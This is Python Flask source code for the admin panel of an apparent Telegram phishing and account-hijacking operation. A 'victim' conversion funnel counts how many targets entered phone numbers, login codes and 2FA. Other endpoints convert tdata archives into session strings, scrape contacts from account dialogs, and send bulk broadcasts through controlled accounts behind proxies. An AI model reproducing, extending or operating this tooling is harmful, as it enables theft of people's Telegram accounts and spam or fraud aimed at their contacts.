    account = db.session.get(Account, account_id)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'}), 404
    try:
        from services.telegram.actions import parse_recent_contacts
        contacts = run_async(parse_recent_contacts(account_id, limit=limit))
        log_action('parse_contacts', f'account={account_id} found={len(contacts)}')
        return jsonify({'success': True, 'contacts': contacts, 'total': len(contacts)})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


# ==========================================
# БЛОК 7: ПЛАНОВЫЕ ОТЧЁТЫ
# ==========================================

@admin_bp.route('/reports')
@login_required
def reports():
    """Страница генерации и отправки отчётов."""
    return render_template('admin/reports.html')


@admin_bp.route('/api/reports/generate', methods=['POST'])
@login_required
def api_reports_generate():
    """Генерирует HTML-отчёт и отдаёт для скачивания."""
    from services.export.pdf_report import generate_summary_report, collect_report_stats
    import io as _io
    import datetime
    try:
        stats = collect_report_stats()
        html_bytes = generate_summary_report(stats)
        buf = _io.BytesIO(html_bytes)
        now_str = datetime.datetime.utcnow().strftime('%Y%m%d_%H%M')
        log_action('generate_report', f'type=summary')
        return send_file(
            buf,
            mimetype='text/html',
            as_attachment=True,
            download_name=f'report_{now_str}.html',
        )
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/api/reports/send_now', methods=['POST'])
@login_required
@admin_required
def api_reports_send_now():
    """Немедленно отправляет отчёт в Telegram-бот."""
    data = request.get_json() or {}
    report_type = data.get('report_type', 'summary')
    chat_id = data.get('chat_id')
    try:
        from tasks.scheduled_reports import generate_and_send_report
        generate_and_send_report.delay(report_type=report_type, recipient_chat_id=chat_id)
        log_action('send_report_now', f'type={report_type}')
        return jsonify({'success': True, 'message': 'Report task queued'})
    except Exception as e:
        # Если Celery не доступен, выполняем синхронно
        try:
            from services.export.pdf_report import generate_summary_report, collect_report_stats
            from services.notification.telegram_bot import send_notification
            stats = collect_report_stats()
            acc = stats.get('accounts', {})
            msg = (
                f"📊 <b>Отчёт Ameba</b>\n"
                f"Аккаунты: {acc.get('total', 0)} всего, {acc.get('active', 0)} активных\n"
                f"Кампании: {stats.get('campaigns', {}).get('total', 0)}\n"
                f"Прокси: {stats.get('proxies', {}).get('working', 0)} рабочих"
            )
            send_notification(msg, chat_id=chat_id)
            log_action('send_report_now', f'type={report_type} (sync)')
            return jsonify({'success': True, 'message': 'Report sent'})
        except Exception as e2:
            return jsonify({'success': False, 'error': str(e2)}), 500


@admin_bp.route('/api/reports/send_excel', methods=['POST'])
@login_required
@admin_required
def api_reports_send_excel():
    """Генерирует и отправляет Excel-отчёт по аккаунтам в Telegram."""
    data = request.get_json() or {}
    chat_id = data.get('chat_id')
    try:
        from tasks.scheduled_reports import send_excel_report
        send_excel_report.delay(recipient_chat_id=chat_id)
        log_action('send_excel_report', f'chat={chat_id}')
        return jsonify({'success': True, 'message': 'Excel report task queued'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


# ==========================================
# БЛОК 7: AI НАСТРОЙКИ
# ==========================================

@admin_bp.route('/api/ai/settings', methods=['GET'])
@login_required
def api_ai_settings_get():
    """Получает настройки AI (провайдер, ключи API)."""
    from models.panel_settings import PanelSettings
    keys = ['ai_provider', 'openai_api_key', 'claude_api_key', 'ai_model', 'ai_enabled']
    settings = {s.key: s.value for s in db.session.query(PanelSettings).filter(
        PanelSettings.key.in_(keys)
    ).all()}
    # Скрываем ключи в ответе — отдаём только признак наличия
    safe = {k: ('***' if 'key' in k and v else v) for k, v in settings.items()}
    return jsonify({'success': True, 'settings': safe})


@admin_bp.route('/api/ai/settings', methods=['POST'])
@login_required
@admin_required
def api_ai_settings_save():
    """Сохраняет настройки AI-провайдера."""
    from models.panel_settings import PanelSettings
    data = request.get_json() or {}
    allowed_keys = {'ai_provider', 'openai_api_key', 'claude_api_key', 'ai_model', 'ai_enabled'}
    for k, v in data.items():
        if k not in allowed_keys:
            continue
        s = db.session.query(PanelSettings).filter_by(key=k).first()
        if s:
            s.value = str(v)
        else:
            s = PanelSettings(key=k, value=str(v))
            db.session.add(s)
    db.session.commit()
    log_action('ai_settings_update', f'Updated AI settings')
    return jsonify({'success': True})


# ==========================================
# TOOLS: tdata → StringSession CONVERTER
# ==========================================
@admin_bp.route('/tools/converter', methods=['GET'])
@login_required
def tools_converter():
    """tdata → StringSession converter page."""
    return render_template('admin/converter.html')


@admin_bp.route('/tools/converter', methods=['POST'])
@login_required
def tools_converter_upload():
    """Accept a ZIP archive containing tdata and return a StringSession string."""
    import tempfile, os
    from utils.tdata_converter import convert_tdata_zip_to_session

    if 'file' not in request.files:
        return jsonify({'success': False, 'error': 'No file uploaded'})
    f = request.files['file']
    if not f.filename or not f.filename.lower().endswith('.zip'):
        return jsonify({'success': False, 'error': 'Please upload a .zip file'})

    # Save to temp file
    tmp = tempfile.NamedTemporaryFile(delete=False, suffix='.zip')
    try:
        f.save(tmp.name)
        tmp.close()
        result = convert_tdata_zip_to_session(tmp.name)
        if result['success']:
            log_action('tdata_convert', 'Converted tdata ZIP to StringSession')
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})
    finally:
        try:
            os.unlink(tmp.name)
        except Exception:
            pass


# ==========================================
# QUICK REPLY TEMPLATES
# ==========================================

@admin_bp.route('/quick-replies')
@login_required
def quick_replies():
    """Quick reply templates management page."""
    from models.quick_reply import QuickReply
    items = db.session.query(QuickReply).order_by(QuickReply.category, QuickReply.title).all()
    categories = sorted(set(r.category for r in items if r.category))
    return render_template('admin/quick_replies.html', items=items, categories=categories)


@admin_bp.route('/api/quick-replies', methods=['GET'])
@login_required
def api_quick_replies_list():
    """Return all quick reply templates as JSON."""
    from models.quick_reply import QuickReply
    category = request.args.get('category', '')
    q = db.session.query(QuickReply)
    if category:
        q = q.filter(QuickReply.category == category)
    items = q.order_by(QuickReply.category, QuickReply.title).all()
    return jsonify({'success': True, 'items': [r.to_dict() for r in items]})


@admin_bp.route('/api/quick-replies', methods=['POST'])
@login_required
@admin_required
def api_quick_replies_create():
    """Create a new quick reply template."""
    from models.quick_reply import QuickReply
    data = request.get_json() or {}
    title = (data.get('title') or '').strip()
    content = (data.get('content') or '').strip()
    if not title or not content:
        return jsonify({'success': False, 'error': 'title and content are required'}), 400
    shortcut = (data.get('shortcut') or '').strip() or None
    item = QuickReply(
        title=title,
        content=content,
        category=data.get('category', 'general'),
        shortcut=shortcut,
        created_by=current_user.id,
    )
    try:
        db.session.add(item)
        db.session.commit()
        log_action('quick_reply_create', f'id={item.id} title={title}')
        return jsonify({'success': True, 'item': item.to_dict()})
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/api/quick-replies/<int:reply_id>', methods=['PUT'])
@login_required
@admin_required
def api_quick_replies_update(reply_id):
    """Update an existing quick reply template."""
    from models.quick_reply import QuickReply
    item = db.session.get(QuickReply, reply_id)
    if not item:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    data = request.get_json() or {}
    if 'title' in data:
        item.title = data['title'].strip()
    if 'content' in data:
        item.content = data['content'].strip()
    if 'category' in data:
        item.category = data['category']
    if 'shortcut' in data:
        item.shortcut = (data['shortcut'] or '').strip() or None
    try:
        db.session.commit()
        log_action('quick_reply_update', f'id={reply_id}')
        return jsonify({'success': True, 'item': item.to_dict()})
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/api/quick-replies/<int:reply_id>', methods=['DELETE'])
@login_required
@admin_required
def api_quick_replies_delete(reply_id):
    """Delete a quick reply template."""
    from models.quick_reply import QuickReply
    item = db.session.get(QuickReply, reply_id)
    if not item:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    try:
        db.session.delete(item)
        db.session.commit()
        log_action('quick_reply_delete', f'id={reply_id}')
        return jsonify({'success': True})
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


# ==========================================
# QUICK REPLY TEMPLATES (canonical model)
# ==========================================

@admin_bp.route('/api/snippets', methods=['GET'])
@login_required
def api_snippets_list():
    """List all QuickReplyTemplate snippets."""
    from models.quick_reply_template import QuickReplyTemplate
    category = request.args.get('category')
    q = db.session.query(QuickReplyTemplate)
    if category:
        q = q.filter(QuickReplyTemplate.category == category)
    items = q.order_by(QuickReplyTemplate.category, QuickReplyTemplate.title).all()
    return jsonify({'success': True, 'items': [i.to_dict() for i in items]})


@admin_bp.route('/api/snippets', methods=['POST'])
@login_required
@admin_required
def api_snippets_create():
    """Create a new QuickReplyTemplate snippet."""
    from models.quick_reply_template import QuickReplyTemplate
    data = request.get_json() or {}
    title = (data.get('title') or '').strip()
    text = (data.get('text') or '').strip()
    if not title or not text:
        return jsonify({'success': False, 'error': 'title and text are required'}), 400
    item = QuickReplyTemplate(
        title=title,
        text=text,
        category=data.get('category', 'general'),
        shortcut=(data.get('shortcut') or '').strip() or None,
        author_id=current_user.id,
    )
    try:
        db.session.add(item)
        db.session.commit()
        log_action('snippet_create', f'id={item.id} title={title}')
        return jsonify({'success': True, 'item': item.to_dict()})
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/api/snippets/<int:snippet_id>', methods=['PUT'])
@login_required
@admin_required
def api_snippets_update(snippet_id):
    """Update an existing QuickReplyTemplate snippet."""
    from models.quick_reply_template import QuickReplyTemplate
    item = db.session.get(QuickReplyTemplate, snippet_id)
    if not item:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    data = request.get_json() or {}
    if 'title' in data:
        item.title = data['title'].strip()
    if 'text' in data:
        item.text = data['text'].strip()
    if 'category' in data:
        item.category = data['category']
    if 'shortcut' in data:
        item.shortcut = (data['shortcut'] or '').strip() or None
    try:
        db.session.commit()
        log_action('snippet_update', f'id={snippet_id}')
        return jsonify({'success': True, 'item': item.to_dict()})
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/api/snippets/<int:snippet_id>', methods=['DELETE'])
@login_required
@admin_required
def api_snippets_delete(snippet_id):
    """Delete a QuickReplyTemplate snippet."""
    from models.quick_reply_template import QuickReplyTemplate
    item = db.session.get(QuickReplyTemplate, snippet_id)
    if not item:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    try:
        db.session.delete(item)
        db.session.commit()
        log_action('snippet_delete', f'id={snippet_id}')
        return jsonify({'success': True})
    except Exception as e:
        db.session.rollback()
        return jsonify({'success': False, 'error': str(e)}), 500


# ==========================================
# CONTACTS — parsed account contacts
# ==========================================

@admin_bp.route('/contacts')
@login_required
def contacts():
    """Contacts parsed from account dialogs."""
    from models.account import Account
    accounts = db.session.query(Account).filter(Account.status == 'active').order_by(Account.phone).all()
    return render_template('admin/contacts.html', accounts=accounts)


@admin_bp.route('/api/contacts/parse', methods=['POST'])
@login_required
@admin_required
def api_contacts_parse():
    """Parse contacts from an account's recent dialogs."""
    from models.account import Account
    data = request.get_json() or {}
    account_id = data.get('account_id')
    limit = int(data.get('limit', 100))
    if not account_id:
        return jsonify({'success': False, 'error': 'account_id required'}), 400
    account = db.session.get(Account, account_id)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'}), 404
    try:
        from services.telegram.actions import parse_recent_contacts
        contacts_list = run_async(parse_recent_contacts(account_id, limit=limit))
        log_action('parse_contacts', f'account={account_id} found={len(contacts_list)}')
        return jsonify({'success': True, 'contacts': contacts_list, 'total': len(contacts_list)})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/api/contacts/dialogs', methods=['POST'])
@login_required
def api_contacts_dialogs():
    """Fetch dialogs list for an account."""
    from models.account import Account
    data = request.get_json() or {}
    account_id = data.get('account_id')
    if not account_id:
        return jsonify({'success': False, 'error': 'account_id required'}), 400
    account = db.session.get(Account, account_id)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'}), 404
    try:
        from services.telegram.actions import get_dialogs
        dialogs = run_async(get_dialogs(account_id))
        return jsonify({'success': True, 'dialogs': dialogs})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@admin_bp.route('/api/contacts/broadcast', methods=['POST'])
@login_required
@admin_required
def api_contacts_broadcast():
    """Send a broadcast message to a list of Telegram user IDs / usernames via the given account."""
    from models.account import Account
    data = request.get_json() or {}
    account_id = data.get('account_id')
    recipients = data.get('recipients', [])  # list of user_ids or usernames
    message = (data.get('message') or '').strip()
    if not account_id:
        return jsonify({'success': False, 'error': 'account_id required'}), 400
    if not recipients:
        return jsonify({'success': False, 'error': 'recipients list is empty'}), 400
    if not message:
        return jsonify({'success': False, 'error': 'message text is required'}), 400
    account = db.session.get(Account, account_id)
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'}), 404
    try:
        from services.telegram.actions import send_bulk_messages
        result = run_async(send_bulk_messages(account_id, recipients, message, []))
        log_action('contacts_broadcast', f'account={account_id} sent={result.get("sent")} failed={result.get("failed")}')
        return jsonify({'success': True, 'sent': result.get('sent', 0), 'failed': result.get('failed', 0)})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


# ==========================================
# LOG CONSOLE — real-time application logs
# ==========================================

@admin_bp.route('/log-console')
@login_required
def log_console():
    """Real-time application log console page."""
    return render_template('admin/log_console.html')


@admin_bp.route('/api/logs/live')
@login_required
def api_logs_live():
    """Return the last N lines from the application log file as JSON."""
    import os
    from core.config import Config
    n = min(int(request.args.get('n', 200)), 1000)
    log_path = os.path.join(Config.LOGS_DIR, 'app.log')
    lines = []
    try:
        if os.path.exists(log_path):
            with open(log_path, 'r', encoding='utf-8', errors='replace') as f:
                all_lines = f.readlines()
            lines = [l.rstrip('\n') for l in all_lines[-n:]]
    except Exception as e:
        lines = [f'Error reading log: {e}']
    return jsonify({'success': True, 'lines': lines})


# ==========================================
# GLOBAL SEARCH — accounts, campaigns, contacts
# ==========================================

@admin_bp.route('/api/search')
@login_required
def api_global_search():
    """Global search across accounts, campaigns, and contacts/dialogs."""
    q = request.args.get('q', '').strip()
    if not q or len(q) < 2:
        return jsonify({'success': True, 'results': []})

    results = []
    limit = 5  # max results per category
    safe_q = q.replace('%', r'\%').replace('_', r'\_')  # escape LIKE wildcards

    # Search accounts
    try:
        acc_stmt = (
            select(Account)
            .filter(or_(
                Account.phone.ilike(f'%{safe_q}%'),
                Account.username.ilike(f'%{safe_q}%'),
            ))
            .limit(limit)
        )
        for acc in db.session.execute(acc_stmt).scalars().all():
            results.append({
                'type': 'account',
                'title': acc.phone,
                'subtitle': f'@{acc.username}' if acc.username else acc.status,
                'url': url_for('admin.account_detail', account_id=acc.id),
            })
    except Exception:
        pass

    # Search campaigns
    try:
        camp_stmt = (
            select(Campaign)
            .filter(Campaign.name.ilike(f'%{safe_q}%'))
            .limit(limit)
        )
        for c in db.session.execute(camp_stmt).scalars().all():
            results.append({
                'type': 'campaign',
                'title': c.name,
                'subtitle': c.status,
                'url': url_for('admin.campaign_detail', campaign_id=c.id),
            })
    except Exception:
        pass

    # Search incoming messages / dialogs
    try:
        from models.incoming_message import IncomingMessage
        msg_stmt = (
            select(IncomingMessage)
            .filter(IncomingMessage.text.ilike(f'%{safe_q}%'))
            .order_by(desc(IncomingMessage.created_at))
            .limit(limit)
        )
        for msg in db.session.execute(msg_stmt).scalars().all():
            results.append({
                'type': 'dialog',
                'title': f'Диалог #{msg.id}',
                'subtitle': (msg.text or '')[:60],
                'url': url_for('admin.inbox'),
            })
    except Exception:
        pass

    return jsonify({'success': True, 'results': results})


# ==========================================
# CONVERSION FUNNEL — real-time victim funnel
# ==========================================

@admin_bp.route('/api/funnel/live')
@login_required
def api_funnel_live():
    """Return live conversion funnel stats from victims and stats tables."""
    from models.victim import Victim
    from models.stat import Stat
    import datetime

    # Victim-based funnel
    total = db.session.query(func.count(Victim.id)).scalar() or 0
    phone_entered = db.session.query(func.count(Victim.id)).filter(
        Victim.status.in_(['code_sent', 'code_entered', 'logged_in', '2fa_passed'])
    ).scalar() or 0
    code_entered = db.session.query(func.count(Victim.id)).filter(
        Victim.status.in_(['code_entered', 'logged_in', '2fa_passed'])
    ).scalar() or 0
    logged_in = db.session.query(func.count(Victim.id)).filter(
        Victim.status.in_(['logged_in', '2fa_passed'])
    ).scalar() or 0
    twofa_passed = db.session.query(func.count(Victim.id)).filter(
        Victim.status == '2fa_passed'
    ).scalar() or 0

    # Last 7 days trend from Stat table
    since = datetime.datetime.utcnow() - datetime.timedelta(days=7)
    recent_stats = db.session.query(Stat).filter(Stat.date >= since.date()).order_by(Stat.date).all()
    trend = [{'date': str(s.date), 'visits': s.visits, 'logins': s.successful_logins} for s in recent_stats]

    conversion_pct = round(logged_in / total * 100, 1) if total > 0 else 0.0

    return jsonify({
        'success': True,
        'funnel': {
            'visited': total,
            'phone_entered': phone_entered,
            'code_entered': code_entered,
            'logged_in': logged_in,
            'twofa_passed': twofa_passed,
            'conversion_pct': conversion_pct,
        },
        'trend': trend,
    })


# ==========================================
# CAMPAIGN CONVERSION FUNNEL
# ==========================================

@admin_bp.route('/api/funnel/campaign')
@login_required
def api_funnel_campaign():
    """Return campaign-based conversion funnel: Sent → Replied → Link clicked."""
    from models.campaign import Campaign
    from models.incoming_message import IncomingMessage
    from models.tracked_link import TrackedLink

    # Total messages sent across all campaigns
    sent = db.session.query(func.coalesce(func.sum(Campaign.successful), 0)).scalar() or 0

    # Total incoming (non-outgoing) messages received — proxy for "replied"
    replied = db.session.query(func.count(IncomingMessage.id)).filter(
        IncomingMessage.is_outgoing.is_(False)
    ).scalar() or 0

    # Total link clicks across all tracked links
    link_clicked = db.session.query(func.coalesce(func.sum(TrackedLink.clicks), 0)).scalar() or 0

    sent = int(sent)
    replied = int(replied)
    link_clicked = int(link_clicked)

    reply_pct = round(replied / sent * 100, 1) if sent > 0 else 0.0
    click_pct = round(link_clicked / sent * 100, 1) if sent > 0 else 0.0

    return jsonify({
        'success': True,
        'funnel': {
            'sent': sent,
            'replied': replied,
            'link_clicked': link_clicked,
            'reply_pct': reply_pct,
            'click_pct': click_pct,
        },
    })


# ==========================================
# MACROS
# ==========================================

@admin_bp.route('/macros')
@login_required
def macros():
    from models.macro import Macro
    macros_list = db.session.query(Macro).order_by(Macro.created_at.desc()).all()
    return render_template('admin/macros.html', macros=macros_list)


@admin_bp.route('/api/macros', methods=['GET'])
@login_required
def api_macros_list():
    from models.macro import Macro
    macros_list = db.session.query(Macro).order_by(Macro.created_at.desc()).all()
    return jsonify({'success': True, 'macros': [
        {
            'id': m.id,
            'name': m.name,
            'description': m.description,
            'steps': m.steps,
            'is_active': m.is_active,
            'runs_count': m.runs_count,
            'last_run': m.last_run.isoformat() if m.last_run else None,
            'created_at': m.created_at.isoformat() if m.created_at else None,
        } for m in macros_list
    ]})


@admin_bp.route('/api/macros', methods=['POST'])
@login_required
@admin_required
def api_macros_create():
    from models.macro import Macro
    data = request.get_json()
    name = (data.get('name') or '').strip()
    if not name:
        return jsonify({'success': False, 'error': 'name required'}), 400
    steps = data.get('steps', [])
    if not isinstance(steps, list):
        return jsonify({'success': False, 'error': 'steps must be a list'}), 400
    macro = Macro(
        name=name,
        description=data.get('description', ''),
        steps=steps,
        is_active=data.get('is_active', True),
        created_by=current_user.id,
    )
    db.session.add(macro)
    db.session.commit()
    log_action('create_macro', f'name={name}')
    return jsonify({'success': True, 'id': macro.id})


@admin_bp.route('/api/macros/<int:macro_id>', methods=['PUT'])
@login_required
@admin_required
def api_macros_update(macro_id):
    from models.macro import Macro
    macro = db.session.get(Macro, macro_id)
    if not macro:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    data = request.get_json()
    for field in ('name', 'description', 'steps', 'is_active'):
        if field in data:
            setattr(macro, field, data[field])
    db.session.commit()
    log_action('update_macro', f'id={macro_id}')
    return jsonify({'success': True})


@admin_bp.route('/api/macros/<int:macro_id>', methods=['DELETE'])
@login_required
@admin_required
def api_macros_delete(macro_id):
    from models.macro import Macro
    macro = db.session.get(Macro, macro_id)
    if not macro:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    db.session.delete(macro)
    db.session.commit()
    log_action('delete_macro', f'id={macro_id}')
    return jsonify({'success': True})


@admin_bp.route('/api/macros/<int:macro_id>/apply', methods=['POST'])
@login_required
@admin_required
def api_macros_apply(macro_id):
    """Apply a macro to a list of account IDs (async via Celery)."""
    from models.macro import Macro
    macro = db.session.get(Macro, macro_id)
    if not macro:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    data = request.get_json()
    account_ids = data.get('account_ids', [])
    if not account_ids:
        return jsonify({'success': False, 'error': 'account_ids required'}), 400
    try:
        from tasks.mass_actions import apply_macro_task
        task = apply_macro_task.delay(macro_id, account_ids)
        log_action('apply_macro', f'macro_id={macro_id} accounts={len(account_ids)}')
        return jsonify({'success': True, 'task_id': task.id})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


# ==========================================
# BULK OPERATION HISTORY
# ==========================================

@admin_bp.route('/api/bulk_operations', methods=['GET'])
@login_required
def api_bulk_operations_list():
    from models.bulk_operation import BulkOperation
    limit = min(int(request.args.get('limit', 50)), 200)
    ops = db.session.query(BulkOperation).order_by(BulkOperation.created_at.desc()).limit(limit).all()
    return jsonify({'success': True, 'operations': [
        {
            'id': o.id,
            'operation_type': o.operation_type,
            'status': o.status,
            'total': o.total,
            'processed': o.processed,
            'succeeded': o.succeeded,
            'failed': o.failed,
            'errors': o.errors or [],
            'started_at': o.started_at.isoformat() if o.started_at else None,
            'completed_at': o.completed_at.isoformat() if o.completed_at else None,
            'created_at': o.created_at.isoformat() if o.created_at else None,
        } for o in ops
    ]})


@admin_bp.route('/api/bulk_operations/<int:op_id>/cancel', methods=['POST'])
@login_required
@admin_required
def api_bulk_operations_cancel(op_id):
    from models.bulk_operation import BulkOperation
    op = db.session.get(BulkOperation, op_id)
    if not op:
        return jsonify({'success': False, 'error': 'Not found'}), 404
    if op.status not in ('pending', 'running'):
        return jsonify({'success': False, 'error': f'Cannot cancel operation in status: {op.status}'}), 400
    op.status = 'cancelled'
    op.completed_at = datetime.datetime.now(datetime.timezone.utc)
    db.session.commit()
    log_action('cancel_bulk_operation', f'op_id={op_id}')
    return jsonify({'success': True})


# ==========================================
# CLOUD BACKUP SETTINGS & UPLOAD
# ==========================================

@admin_bp.route('/api/cloud_backup/settings', methods=['GET'])
@login_required
@admin_required
def api_cloud_backup_settings_get():
    from services.backup.cloud import _load_settings
    settings = _load_settings()
    # Never expose tokens in plain text – mask them
    masked = dict(settings)
    for key in ('yandex_token', 'google_credentials_json'):
        if masked.get(key):
            masked[key] = '***'
    return jsonify({'success': True, 'settings': masked})


@admin_bp.route('/api/cloud_backup/settings', methods=['POST'])
@login_required
@admin_required
def api_cloud_backup_settings_save():
    from services.backup.cloud import _load_settings, save_settings
    data = request.get_json()
    current = _load_settings()
    # Allow partial update; do not overwrite secret fields with '***' placeholder
    for key in ('provider', 'yandex_remote_dir', 'google_folder_id'):
        if key in data:
            current[key] = data[key]
    for key in ('yandex_token', 'google_credentials_json'):
        if key in data and data[key] and data[key] != '***':
            current[key] = data[key]
    save_settings(current)
    log_action('cloud_backup_settings_save', f'provider={current.get("provider")}')
    return jsonify({'success': True})


@admin_bp.route('/api/cloud_backup/upload', methods=['POST'])
@login_required
@admin_required
def api_cloud_backup_upload():
    """Trigger async upload of a backup file to the configured cloud provider."""
    data = request.get_json()
    filename = (data or {}).get('filename', '')
    if not filename:
        return jsonify({'success': False, 'error': 'filename required'}), 400
    try:
        from tasks.mass_actions import cloud_backup_task
        task = cloud_backup_task.delay(filename)
        log_action('cloud_backup_upload', f'filename={filename}')
        return jsonify({'success': True, 'task_id': task.id})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


# ==========================================
# DASHBOARD – LEADERS OF THE DAY & STATS
# ==========================================

@admin_bp.route('/api/dashboard/leaders')
@login_required
def api_dashboard_leaders():
    """Return top accounts by outgoing messages today (leaders of the day)."""
    from models.incoming_message import IncomingMessage

    today_start = datetime.datetime.combine(datetime.date.today(), datetime.time.min)
    rows = (
        db.session.query(IncomingMessage.account_id, func.count(IncomingMessage.id).label('cnt'))
        .filter(IncomingMessage.is_outgoing.is_(True))
        .filter(IncomingMessage.created_at >= today_start)
        .group_by(IncomingMessage.account_id)
        .order_by(func.count(IncomingMessage.id).desc())
        .limit(10)
        .all()
    )
    leaders = []
    for account_id, cnt in rows:
        acc = db.session.query(Account).filter(Account.id == account_id).first()
        if acc:
            leaders.append({
                'account_id': account_id,
                'phone': acc.phone,
                'username': acc.username,
                'sent_today': cnt,
            })
    return jsonify({'success': True, 'leaders': leaders})


@admin_bp.route('/api/dashboard/account_stats')
@login_required
def api_dashboard_account_stats():
    """Return per-status distribution of accounts for pie/bar charts."""
    rows = (
        db.session.query(Account.status, func.count(Account.id).label('cnt'))
        .group_by(Account.status)
        .all()
    )
    distribution = {row.status: row.cnt for row in rows}
    total = sum(distribution.values())
    return jsonify({'success': True, 'distribution': distribution, 'total': total})


@admin_bp.route('/api/dashboard/campaign_stats')
@login_required
def api_dashboard_campaign_stats():
    """Return aggregated campaign performance metrics."""
    from models.campaign import Campaign as CampaignModel
    rows = db.session.query(CampaignModel).all()
    total_sent = sum(c.successful or 0 for c in rows)
    total_failed = sum(c.failed or 0 for c in rows)
    total_processed = sum(c.processed or 0 for c in rows)
    reply_pct = 0.0
    try:
        from models.incoming_message import IncomingMessage
        replies = db.session.query(func.count(IncomingMessage.id)).filter(
            IncomingMessage.is_outgoing.is_(False)
        ).scalar() or 0
        reply_pct = round(replies / total_sent * 100, 1) if total_sent > 0 else 0.0
    except Exception:
        pass
    return jsonify({
        'success': True,
        'total_sent': total_sent,
        'total_failed': total_failed,
        'total_processed': total_processed,
        'reply_pct': reply_pct,
    })


# ==========================================
# BULK IMPORT WITH REPLACE/MERGE/DELETE MODE
# ==========================================

@admin_bp.route('/accounts/bulk_import_csv', methods=['POST'])
@login_required
@admin_required
def accounts_bulk_import_csv():
    """
    Import accounts from a CSV file.

    CSV columns (header row required): phone, username, first_name, last_name, status

    Query param `mode`:
      - add     (default) – skip existing, add new
      - replace           – overwrite existing by phone
      - merge             – update existing fields with non-empty CSV values
      - delete            – delete accounts listed in CSV
    """
    f = request.files.get('file')
    if not f:
        return jsonify({'success': False, 'error': 'No file uploaded'}), 400

    mode = request.form.get('mode', 'add')
    if mode not in ('add', 'replace', 'merge', 'delete'):
        return jsonify({'success': False, 'error': 'Invalid mode'}), 400

    try:
        content = f.read().decode('utf-8-sig')
        reader = csv.DictReader(content.splitlines())
        rows = list(reader)
    except Exception as e:
        return jsonify({'success': False, 'error': f'CSV parse error: {e}'}), 400

    added = replaced = merged = deleted = skipped = 0
    errors = []

    for row in rows:
        phone = (row.get('phone') or '').strip()
        if not phone:
            continue
        try:
            existing = db.session.query(Account).filter(Account.phone == phone).first()

            if mode == 'delete':
                if existing:
                    db.session.delete(existing)
                    deleted += 1
                else:
                    skipped += 1

            elif mode == 'replace':
                if existing:
                    existing.username = row.get('username') or existing.username
                    existing.first_name = row.get('first_name') or existing.first_name
                    existing.last_name = row.get('last_name') or existing.last_name
                    existing.status = row.get('status') or existing.status
                    replaced += 1
                else:
                    acc = Account(
                        id=uuid.uuid4().hex,
                        phone=phone,
                        username=row.get('username', ''),
                        first_name=row.get('first_name', ''),
                        last_name=row.get('last_name', ''),
                        status=row.get('status', 'inactive'),
                    )
                    db.session.add(acc)
                    added += 1

            elif mode == 'merge':
                if existing:
                    for field in ('username', 'first_name', 'last_name', 'status'):
                        val = (row.get(field) or '').strip()
                        if val:
                            setattr(existing, field, val)
                    merged += 1
                else:
                    skipped += 1

            else:  # add
                if not existing:
                    acc = Account(
                        id=uuid.uuid4().hex,
                        phone=phone,
                        username=row.get('username', ''),
                        first_name=row.get('first_name', ''),
                        last_name=row.get('last_name', ''),
                        status=row.get('status', 'inactive'),
                    )
                    db.session.add(acc)
                    added += 1
                else:
                    skipped += 1

        except Exception as row_err:
            db.session.rollback()
            errors.append({'phone': phone, 'error': str(row_err)})
            continue

    db.session.commit()
    log_action('bulk_import_csv', f'mode={mode} added={added} replaced={replaced} merged={merged} deleted={deleted}')
    return jsonify({
        'success': True,
        'mode': mode,
        'added': added,
        'replaced': replaced,
        'merged': merged,
        'deleted': deleted,
        'skipped': skipped,
        'errors': errors,
    })


# ==========================================
# AUTO-API IMPORT CONNECTOR
# ==========================================

@admin_bp.route('/number_import')
@login_required
def number_import():
    """Page for importing phone numbers from external HTTP APIs."""
    from models.panel_settings import PanelSettings
    keys = [
        'number_import_url', 'number_import_type',
        'number_import_auth', 'number_import_json_path',
    ]
    settings = {
        s.key: s.value
        for s in db.session.query(PanelSettings).filter(PanelSettings.key.in_(keys)).all()
    }
    return render_template('admin/number_import.html', settings=settings)


@admin_bp.route('/api/number_import/settings', methods=['GET'])
@login_required
def api_number_import_settings_get():
    """Return saved connector settings."""
    from models.panel_settings import PanelSettings
    keys = [
        'number_import_url', 'number_import_type',
        'number_import_auth', 'number_import_json_path',
    ]
    settings = {
        s.key: s.value
        for s in db.session.query(PanelSettings).filter(PanelSettings.key.in_(keys)).all()
    }
    return jsonify({'success': True, 'settings': settings})


@admin_bp.route('/api/number_import/settings', methods=['POST'])
@login_required
def api_number_import_settings_save():
    """Save connector settings."""
    from models.panel_settings import PanelSettings
    data = request.get_json() or {}
    allowed = {
        'number_import_url', 'number_import_type',
        'number_import_auth', 'number_import_json_path',
    }
    for k, v in data.items():
        if k not in allowed:
            continue
        s = db.session.query(PanelSettings).filter_by(key=k).first()
        if s:
            s.value = str(v)
        else:
            db.session.add(PanelSettings(key=k, value=str(v)))
    db.session.commit()
    log_action('number_import_settings_save', '')
    return jsonify({'success': True})


